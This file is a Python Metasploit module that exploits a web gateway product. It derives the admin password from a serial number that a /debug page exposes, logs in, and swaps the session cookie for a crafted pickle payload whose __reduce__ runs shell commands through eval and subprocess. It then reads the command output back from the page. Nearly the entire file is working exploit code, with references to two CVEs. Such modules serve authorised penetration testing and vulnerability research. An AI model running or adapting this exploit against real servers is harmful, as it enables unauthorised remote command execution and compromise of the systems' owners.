#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import logging

dependencies_missing = ""
try:
    import requests
    import pickle
    from lxml import html, etree
    import hashlib
    import base64
    import subprocess
    import json
except ImportError as e:
    dependencies_missing = str(e)

from metasploit import module

metadata = {
    'name': 'System Gateway Exploit',
    'description': '''
        Execute a default password and pickle vulnerability to gain remote access to a webserver
    ''',
    'authors': [
        'mjm'
    ],
    'date': '2023-02-15',
    'license': 'MSF_LICENSE',
    'references': [
        {'type': 'url', 'ref': 'https://nvd.nist.gov/vuln/detail/CVE-2022-40238'},
        {'type': 'url', 'ref': 'https://nvd.nist.gov/vuln/detail/CVE-2020-25753'},
    ],
    'targets': [
      {'platform': 'unix', 'arch': 'cmd'},
      {'platform': 'linux', 'arch': 'cmd'},
      {'platform': 'windows', 'arch': 'cmd'},
    ],
    "type": "remote_exploit",
    'options': {
        "SSL": {'type': 'bool', 'description': 'Use SSL when connecting to the server', 'required': False, 'default': False},
        'RHOST': {'type': 'address', 'description': 'Target address', 'required': True, 'default': None},
        'RPORT': {'type': 'int', 'description': 'Target port', 'required': False, 'default': None},
        "PAYLOAD": {"type": 'string', 'description':"The payload to use", 'required': True, 'default': "cmd/unix/generic"}
    }
}

# If the object you are copying has something else, use that instead

exec_str = f"Class(user, token=token, login='hacked', description=r(cmd, shell=True, text=True, capture_output=True).stdout)"
class Session(object):
    def __reduce__(self):
        # If you just want to run raw python commands, do this
        #return (exec, (self.cmd, {}))

        # This is a more elegant solution that doesnt invalidate the session _and_ executes commands on the system and captures output
        return (eval, (exec_str, {"Class": self.__class__, 'r':subprocess.run, **self.__dict__,}))

    @classmethod
    def payloadFromToken(cls, old_token, cmd):
        j = pickle.loads(base64.b64decode(old_token))
        j.cmd = cmd
        o = pickle.dumps(j)
        return base64.b64encode(o).decode("utf-8")


def get_serial_number(url):
    r = requests.get(url + "/debug")
    if r.status_code != 200:
        module.log(f'Failed to connect to server: {r.status_code} {r.text}', "error")
        return
    tree = html.fromstring(r.text)
    return tree.get_element_by_id("serial-number").text

def check(args):
    ssl = args['SSL'] in ("True", True, "true") 
    url = f'http{"s" if ssl else ""}://{args["RHOST"]}{":" + str(args.get("RPORT", None)) if args.get("RPORT", "") else ""}'
    try:
        serial_number = get_serial_number(url)
        if not serial_number:
            return "safe"
        return 'vulnerable'
    except Exception as e:
        module.log('Failed to get serial number: {}({})'.format(type(e), e), "error")
        return 'detected'
    

def run(args):
    module.LogHandler.setup(msg_prefix='{} - '.format(args['RHOST']))
    if dependencies_missing:
        module.log(f'Module dependency error: {dependencies_missing}', "error")
        return

    if 'payload_encoded' in args:
        payload = base64.b64decode(args['payload_encoded']).decode()
        if payload:
            if args.get("DEBUG", "") == "true":
                module.log("setting CMD to " +  payload)
            args["CMD"] = payload
    ssl = args['SSL'] in ("True", True, "true") 
    url = f'http{"s" if ssl else ""}://{args["RHOST"]}{":" + str(args.get("RPORT", None)) if args.get("RPORT", "") else ""}'
    # Get serial number
    try:
        serial_number = get_serial_number(url)
        if not serial_number:
            return
        module.log(f"Found serial Number: {serial_number}")
    except Exception as e:
        module.log('Failed to get serial number: {}({})'.format(type(e), e), "error")
        return
    
    # Get password from SN
    password = hashlib.sha1(serial_number.encode()).hexdigest()
    password = password.upper()[:10]
    if args.get("VERBOSE", "") == "true":
        module.log(f'Derived admin password: {password}. Attempting login...')

    with requests.Session() as s:
        r = s.post(url + "/login", data={"username": "admin", "password": password})
        auth_token = s.cookies.get("auth_token")
        if not auth_token:
            module.log(f"Failed to login {r.status_code} {r.text}", "error")
            return
        module.report_correct_password("admin", password)
        module.log(f"Successfully logged in with admin:{password}")

        try:
            new_token = Session.payloadFromToken(auth_token, args.get("CMD"))
        except Exception as E:
            module.log(f"Error generating auth_token exploit: {type(E).__name__}({E})")
        s.cookies.set("auth_token", new_token)
        if args.get("VERBOSE", "") == "true":
            module.log(f"Generated exploit token: {new_token}", "good")
        else:
            module.log(f"Generated exploit token ({len(auth_token)} bytes)")
        r = s.get(url)
        try:
            tree = html.fromstring(r.text)
            nav = tree.body.findall("nav")
            if not nav:
                module.log("Error finding results, Unknown exploit status", "error")
                return
            comments = [itm.text for itm in nav[0] if itm.tag is etree.Comment]
            if not comments:
                module.log("Error finding results, Unknown exploit status", "error")
                return
            x = json.loads(comments[0])
            module.log("Exploit succeeded, dumping output:", "good")
            if "description" in x:
                module.log(x.get("description").strip())
            else:
                module.log("did not detect script output", "warn")
        except Exception as E:
            module.log(f"Exploit failed. {type(E).__name__} {E}")

if __name__ == '__main__':
    module.run(metadata, run, soft_check=check)
